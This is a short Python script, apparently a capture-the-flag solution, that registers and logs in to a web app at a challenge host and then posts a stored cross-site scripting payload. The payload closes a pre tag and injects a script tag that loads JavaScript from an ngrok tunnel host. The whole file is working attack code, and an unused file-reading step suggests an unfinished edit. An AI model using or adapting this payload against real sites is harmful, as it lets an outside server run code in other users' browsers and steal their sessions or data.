import requests
import sys

TARGET_URL = 'http://gc1.eng.run:32571'

s = requests.Session()

def login(us,pw):
    data = {
        "username":us,
        "password":pw,
        "login":"Login"
    }
    res = s.post(f"{TARGET_URL}/login",data=data)
    print(res.text)

def register(us,pw):
    data = {
        "username":us,
        "password":pw,
        "register":"Register"
    }
    res = s.post(f"{TARGET_URL}/register",data=data)

def post(payload):
    data = {
        "title":"test",
        "body":f"</pre><script src='http://f15d-103-93-37-18.ngrok.io/test2.js'></script>",
        "post":"Make Post"
    }

    res = s.post(f"{TARGET_URL}/makepost",data=data)
    print(res.text)

f = open(sys.argv[1],'r')
payload=f.read().replace('\n', ' ')

register("navy","test")
login("navy","test")
post(payload)